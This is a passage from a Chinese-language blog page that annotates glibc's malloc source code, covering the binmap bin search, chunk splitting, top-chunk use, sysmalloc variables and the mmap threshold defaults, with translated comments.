class="code"><pre><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">           bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">           (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">           that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">           The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">           when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   通过扫描 bin，从下一个更大的 bin 开始，搜索一个块。这个搜索严格按照最佳适配原则进行；</span></span><br><span class="line"><span class="comment">   也就是说，选择适合的最小块（如果有多个相同大小的块，则选择近期最少使用的块）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   位图的使用避免了需要检查大多数块是否非空的情况。</span></span><br><span class="line"><span class="comment">   在热身阶段（warm-up phases）中，当还没有返回任何块时，跳过所有 bin 的特殊情况比看起来快得多。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        ++idx;</span><br><span class="line">        <span class="comment">// 获取对应的bin</span></span><br><span class="line">        bin   = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 获取当前索引在binmap中的block索引</span></span><br><span class="line">        <span class="comment">// #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5</span></span><br><span class="line">        <span class="comment">// Binmap按block管理，每个block为一个int，共32个bit，可以表示32个bin中是否有空闲chunk存在</span></span><br><span class="line">        <span class="comment">// 所以这里是右移5</span></span><br><span class="line">        block = idx2block(idx);</span><br><span class="line">        <span class="comment">// 获取当前块大小对应的映射，这里可以得知相应的bin中是否有空闲块</span></span><br><span class="line">        <span class="built_in">map</span>   = av-&gt;binmap[ block ];</span><br><span class="line">        <span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line">        <span class="comment">// 将idx对应的比特位设置为1，其它位为0</span></span><br><span class="line">        bit   = idx2bit(idx);</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br></pre></td></tr></table></figure><h5 id="找到一个合适的-MAP"><a href="#找到一个合适的-MAP" class="headerlink" title="找到一个合适的 MAP"></a>找到一个合适的 MAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Skip rest of block if there are no more set bits in this block.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 如果bit&gt;map，则表示该 map 中没有比当前所需要chunk大的空闲块</span></span><br><span class="line"><span class="comment">// 如果bit为0，那么说明，上面idx2bit带入的参数为0。</span></span><br><span class="line"><span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 寻找下一个block，直到其对应的map不为0。</span></span><br><span class="line">        <span class="comment">// 如果已经不存在的话，那就只能使用top chunk了</span></span><br><span class="line">        <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[ block ]) == <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 获取其对应的bin，因为该map中的chunk大小都比所需的chunk大，而且</span></span><br><span class="line">    <span class="comment">// map本身不为0，所以必然存在满足需求的chunk。</span></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="找到合适的-BIN"><a href="#找到合适的-BIN" class="headerlink" title="找到合适的 BIN"></a>找到合适的 BIN</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="comment">// 从当前map的最小的bin一直找，直到找到合适的bin。</span></span><br><span class="line"><span class="comment">// 这里是一定存在的</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="简单检查-CHUNK"><a href="#简单检查-CHUNK" class="headerlink" title="简单检查 CHUNK"></a>简单检查 CHUNK</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line"><span class="comment">// 获取对应的bin</span></span><br><span class="line">victim = last(bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span></span><br><span class="line"><span class="comment">// 这种情况发生的概率应该很小。</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">    av-&gt;binmap[ block ] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin                 = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="真正取出-CHUNK"><a href="#真正取出-CHUNK" class="headerlink" title="真正取出 CHUNK"></a>真正取出 CHUNK</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取对应victim的大小</span></span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line">    <span class="comment">// 计算分割后剩余的大小</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="comment">// 如果分割后不够一个chunk怎么办？</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="comment">// 如果够，尽管分割</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 计算剩余的chunk的偏移</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">           have to perform a complete insert here.  */</span></span><br><span class="line">        <span class="comment">// 将剩余的chunk插入到unsorted bin中</span></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd       = remainder;</span><br><span class="line">        fwd-&gt;bk       = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="comment">// 如果在small bin范围内，就将其标记为remainder</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb)) av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置victim的使用状态</span></span><br><span class="line">        set_head(victim,</span><br><span class="line">                 nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 设置remainder的使用状态，这里是为什么呢？</span></span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">// 设置remainder的大小</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="comment">// chunk状态转换到mem状态</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-top-chunk"><a href="#使用-top-chunk" class="headerlink" title="使用 top chunk"></a>使用 top chunk</h5><p>如果所有的 bin 中的 chunk 都没有办法直接满足要求（即不合并），或者说都没有空闲的 chunk。那么我们就只能使用 top chunk 了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">       (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">       search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">       less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">       be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">       limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">       MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">       exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">       reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">       to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果足够大，将与内存末尾（保存在 av-&gt;top 中）相邻的块分割出来。</span></span><br><span class="line"><span class="comment">   注意，这符合最佳适配搜索规则。实际上，av-&gt;top 被视为比任何其他可用块都更大（因此更不适配），</span></span><br><span class="line"><span class="comment">   因为它可以扩展到任意大小（受系统限制）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   我们要求 av-&gt;top 在初始化后始终存在（即大小 &gt;= MINSIZE），</span></span><br><span class="line"><span class="comment">   因此如果当前请求会耗尽它，它将被重新补充。</span></span><br><span class="line"><span class="comment">   （确保其存在的主要原因是我们可能需要 MINSIZE 的空间来放置 sysmalloc 中的栅栏。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size   = chunksize(victim);</span><br><span class="line">    <span class="comment">// 如果分割之后，top chunk 大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">        av-&gt;top        = remainder;</span><br><span class="line">        <span class="comment">// 这里设置 PREV_INUSE 是因为 top chunk 前面的 chunk 如果不是 fastbin，就必然会和</span></span><br><span class="line">        <span class="comment">// top chunk 合并，所以这里设置了 PREV_INUSE。</span></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，判断是否有 fast chunk</span></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">        <span class="comment">// 先执行一次fast bin的合并</span></span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="comment">// 判断需要的chunk是在small bin范围内还是large bin范围内</span></span><br><span class="line">        <span class="comment">// 并计算对应的索引</span></span><br><span class="line">        <span class="comment">// 等待下次再看看是否可以</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">            idx = smallbin_index(nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index(nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="堆内存不够"><a href="#堆内存不够" class="headerlink" title="堆内存不够"></a>堆内存不够</h5><p>如果堆内存不够，我们就需要使用 <code>sysmalloc</code> 来申请内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 否则的话，我们就只能从系统中再次申请一点内存了。</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="_libc_calloc"></a>_libc_calloc</h5><p>calloc 也是 libc 中的一种申请内存块的函数。在 <code>libc</code>中的封装为 <code>_libc_calloc</code>，具体介绍如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  Returns a pointer to n_elements * element_size bytes, with all locations</span></span><br><span class="line"><span class="comment">  set to zero.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  返回一个指向 n_elements * element_size 字节的指针，其中所有位置都被设置为零。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_calloc(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br></pre></td></tr></table></figure><h5 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h5><p>正如该函数头的注释所言，该函数用于当前堆内存不足时，需要向系统申请更多的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc handles malloc cases requiring more memory from the system.</span></span><br><span class="line"><span class="comment">   On entry, it is assumed that av-&gt;top does not have enough</span></span><br><span class="line"><span class="comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span></span><br><span class="line"><span class="comment">   be extended or replaced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc 处理需要从系统获取更多内存的 malloc 情况。</span></span><br><span class="line"><span class="comment">   在进入函数时，假设 av-&gt;top 没有足够的空间来满足 nb 字节的请求，</span></span><br><span class="line"><span class="comment">   因此需要扩展或替换 av-&gt;top。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">sysmalloc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span> &#123;</span><br><span class="line">  mchunkptr old_top;        <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size; <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">char</span> *old_end;            <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size; <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="type">char</span> *brk; <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction; <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;   <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                  <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;          <span class="comment">/* remainder frOm allocation */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">sysmalloc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span> &#123;</span><br><span class="line">  mchunkptr old_top;        <span class="comment">/* av-&gt;top 的初始值 */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size; <span class="comment">/* 其大小 */</span></span><br><span class="line">  <span class="type">char</span> *old_end;            <span class="comment">/* 其结束地址 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size; <span class="comment">/* 传递给第一次 MORECORE 或 mmap 调用的参数 */</span></span><br><span class="line">  <span class="type">char</span> *brk; <span class="comment">/* MORECORE 的返回值 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction; <span class="comment">/* 传递给第二次 MORECORE 调用的参数 */</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;   <span class="comment">/* 第二次 MORECORE 的返回值 */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* 新空间前面不可用的字节数 */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* 新空间末尾剩余的部分页面 */</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">/* 对齐后的 brk 偏移量 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                  <span class="comment">/* 分配/返回的块 */</span></span><br><span class="line">  mchunkptr remainder;          <span class="comment">/* 剩余的分配块 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* 剩余块的大小 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>我们可以主要关注一下 <code>pagesize</code>，其</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> EXEC_PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXEC_PAGESIZE   4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GLRO(name) _##name</span></span><br><span class="line"><span class="type">size_t</span> _dl_pagesize = EXEC_PAGESIZE;</span><br></pre></td></tr></table></figure><p>所以，<code>pagesize=4096=0x1000</code>。</p><h5 id="考虑-mmap"><a href="#考虑-mmap" class="headerlink" title="考虑 mmap"></a>考虑 mmap</h5><p>正如开头注释所言如果满足如下任何一种条件</p><ol><li>没有分配堆。</li><li>申请的内存大于 <code>mp_.mmap_threshold</code>，并且 mmap 的数量小于最大值，就可以尝试使用 mmap。</li></ol><p>默认情况下，临界值为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span> &#123;</span><br><span class="line">    .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">    .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">    .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">    .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">    .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        ,</span><br><span class="line">    .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">    .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">    .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">    .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>DEFAULT_MMAP_THRESHOLD</code> 为 128*1024 字节，即 128 K。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MMAP_THRESHOLD_MAX and _MIN are the bounds on the 